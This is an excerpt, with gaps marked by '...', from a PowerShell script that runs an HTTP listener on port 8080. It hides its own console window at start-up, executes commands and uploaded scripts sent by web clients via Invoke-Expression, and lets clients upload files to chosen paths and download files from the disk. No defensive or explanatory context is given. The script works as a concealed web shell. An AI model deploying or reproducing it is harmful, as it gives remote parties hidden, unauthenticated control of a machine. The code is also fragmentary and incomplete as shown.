Param([STRING]$BINDING = 'http://localhost:8080/', [STRING]$BASEDIR = "C:")
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
if ($BASEDIR -eq ""){$BASEDIR = (Get-Location -PSProvider "FileSystem").ToString()}
...
try {$RESULT = Invoke-Expression -EA SilentlyContinue $FORMFIELD 2> $NULL | Out-String}catch{}
if ($Error.Count -gt 0){
...
$BOUNDARY = $NULL
if ($REQUEST.ContentType -match "boundary=(.*);"){$BOUNDARY = "--" + $MATCHES[1]}else{
if ($REQUEST.ContentType -match "boundary=(.*)$"){$BOUNDARY = "--" + $MATCHES[1]}}
if ($BOUNDARY){
...
$FILEDATA = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`r`n$"}}}else{
if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-data; name=(.*)"){
$HEADERNAME = $MATCHES[1] -replace '\"'
...
try {$RESULT = Invoke-Expression -EA SilentlyContinue $EXECUTE 2> $NULL | Out-String}catch{}
if ($Error.Count -gt 0){
$RESULT += "`nError while executing script $SOURCENAME`n`n"
$RESULT += $Error[0]
$Error.Clear()}}else{$RESULT = "No file data received"}}}}else{$RESULT = "No client data received"}break}
{ $_ -like "* /download" }{
if ($REQUEST.HasEntityBody){
$READER = New-Object System.IO.StreamReader($REQUEST.InputStream, $REQUEST.ContentEncoding)
$DATA = $READER.ReadToEnd()
...
$FORMFIELD = $FORMFIELD -replace "^`"","" -replace "`"$",""}else{ # GET request
$FORMFIELD = ''
$FORMFIELD = [URI]::UnescapeDataString(($REQUEST.Url.Query -replace "\+"," "))
...
$RESPONSEWRITTEN = $TRUE}catch{}
if ($Error.Count -gt 0){
$RESULT += "`nError while downloading '$FORMFIELD'`n`n"
$RESULT += $Error[0]
$Error.Clear()}}else{$RESULT = "File $FORMFIELD not found"}}
$HTMLRESPONSE = $HTMLRESPONSE -replace '!FORMFIELD', $FORMFIELD
break}
"GET /upload"{break}
"POST /upload"{
...
$TARGETNAME = Join-Path $FILENAME -ChildPath $(Split-Path $SOURCENAME -Leaf)} else {$TARGETNAME = $FILENAME}
try {
[IO.File]::WriteAllText($TARGETNAME, $FILEDATA, $REQUEST.ContentEncoding)}catch{}
if ($Error.Count -gt 0){
$RESULT += "`nError saving '$TARGETNAME'`n`n"
$RESULT += $Error[0]
$Error.Clear()}else{
$RESULT = "File $SOURCENAME successfully uploaded as $TARGETNAME"}}else{$RESULT = "No file data received"}}else{$RESULT = "Missing target file name"}}}}else{$RESULT = "No client data received"}break}
"GET /log"{
$RESULT = $WEBLOG
break}
"GET /time"{
...
break}"GET /quit"{break}"GET /exit"{break}default{
...
if (Test-Path $CHECKFILE -PathType Leaf){break}$CHECKFILE = ""}
if ($CHECKFILE -eq ""){
...
$HTMLRESPONSE += "</pre><hr></body></html>"}}else{
if (Test-Path $CHECKDIR -PathType Leaf){$CHECKFILE = $CHECKDIR}}
if ($CHECKFILE -ne ""){try {
...
$RESPONSE.ContentType = $MIMEHASH.Item($EXTENSION)}else{
$RESPONSE.ContentType = "application/octet-stream"
